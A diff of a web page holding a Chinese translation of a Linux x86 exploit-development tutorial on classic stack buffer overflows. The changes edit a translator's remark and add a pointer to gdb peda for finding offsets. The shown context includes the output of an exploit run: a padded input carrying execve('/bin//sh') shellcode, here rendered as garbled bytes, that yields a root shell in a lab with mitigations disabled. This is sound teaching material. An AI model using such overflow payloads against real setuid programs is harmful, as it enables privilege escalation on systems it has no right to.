@@ -215,9 +215,6 @@
     <div class="post-content">
       
         <p>Posted on <a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="external">May 8, 2015</a> by <a href="https://sploitfun.wordpress.com/author/sploitfun/" target="_blank" rel="external">sploitfun</a></p>
-<blockquote>
-<p>前文部分是翻译, 后文译者扩展了部分内容</p>
-</blockquote>
 <p><em>VM Setup</em>: Ubuntu 12.04 (x86)</p>
 <p>这是该系列中最简单的一篇文章，并且，你已经能够在网上找到许多内容相似的文章。尽管如此，我仍然想要在自己博客上也写一篇关于它的文章，因为这将会为我之后要发表的post打下基础。</p>
 <a id="more"></a>
@@ -278,6 +275,7 @@
 <p>执行上述的exp, 我们可以得到一个shell:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> python exp.py </div><div class="line">Calling vulnerable program</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S���</div><div class="line"></div><div class="line"><span class="meta">#</span> id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(sploitfun)</div><div class="line"><span class="meta">#</span> exit</div><div class="line"><span class="meta">$</span></div></pre></td></tr></table></figure>
 <p><em>NOTE</em>: Inorder to get this root shell, we turned off many exploit mitigation techniques. Infact for all the posts in level 1, I have disabled these exploit mitigation techniques, since the objective of level 1, is to introduce you to vulnerabilities. And  real fun happens when we get to “Level 2” of <a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/" target="_blank" rel="external">Linux (x86) Exploit Development Tutorial Series</a>, where I will talk about bypassing these exploit mitigation techniques!!!</p>
+<p>可以使用<code>gdb peda</code>工具直接计算出偏移地址, 具体可见下面这篇<a href="https://cloud.tencent.com/developer/article/1037874" target="_blank" rel="external">文章</a></p>
 
       
     </div>
